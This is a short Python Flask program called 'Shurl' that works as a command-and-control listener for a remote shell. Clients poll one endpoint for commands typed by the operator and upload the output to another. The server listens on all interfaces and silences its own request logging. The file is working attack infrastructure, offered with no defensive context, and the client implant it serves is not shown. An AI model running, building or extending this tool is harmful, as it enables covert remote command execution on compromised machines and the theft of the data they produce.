from flask import Flask, request
from werkzeug.serving import make_server
import readline, logging, argparse, os, threading, time


log = logging.getLogger('werkzeug')
log.disabled = True

app = Flask(__name__)
wait = True
HISTORY_FILENAME = '/tmp/.history'

globals()["cmd"] = ""
globals()["out"] = False
globals()["_CONNECTED"] = 0

@app.route("/c")
def get_cmd():
    if globals()["_CONNECTED"] == 0:
        globals()["_CONNECTED"] = 1
    c = globals()["cmd"]
    globals()["cmd"] = ""
    return c

@app.route("/u", methods=["POST"])
def upload():
    f = request.files['f']
    globals()["out"] = f.read().decode("utf-16")
    return ""

def srv(app, port):
    server = make_server("0.0.0.0", port, app)
    server.serve_forever()


def main(args):
    threading.Thread(target=srv, args=(app, args.port), daemon=True).start()
    print("Waiting client...", end='\r')
    while True:
        wait = True
        if globals()["_CONNECTED"] == -1:
            print("Waiting client...", end='\r')
            time.sleep(3)
            globals()["_CONNECTED"] = 0
            continue
        if globals()["_CONNECTED"] == 0:
            time.sleep(.3)
            continue
        elif globals()["_CONNECTED"] == 1:
            globals()["_CONNECTED"] = 2
            print("Client connected !")

        try:
            cmd = input("> ")
            if cmd == "exit":
                globals()["cmd"] = cmd
                globals()["_CONNECTED"] = -1
                continue
            else:
                globals()["cmd"] = cmd + " ; echo ''"
        except KeyboardInterrupt:
            _exit()

        while wait:
            try:
                if globals()["out"]:
                    print(globals()["out"])
                    globals()["out"] = False
                    wait = False
                    globals()["cmd"] = ""
                else:
                    time.sleep(.200)
            except KeyboardInterrupt:
                wait = False
                print("", end="\r")
            except Exception as ex:
                print(ex)

def _exit():
    readline.write_history_file(HISTORY_FILENAME)
    exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Shurl')
    parser.add_argument('-p', dest="port", type=int, help='Server port', default=8000)
    args = parser.parse_args()

    if not os.path.exists(HISTORY_FILENAME):
        open(HISTORY_FILENAME, "w").write("")

    readline.read_history_file(HISTORY_FILENAME)

    try:
        main(args)
    except KeyboardInterrupt:
        _exit()
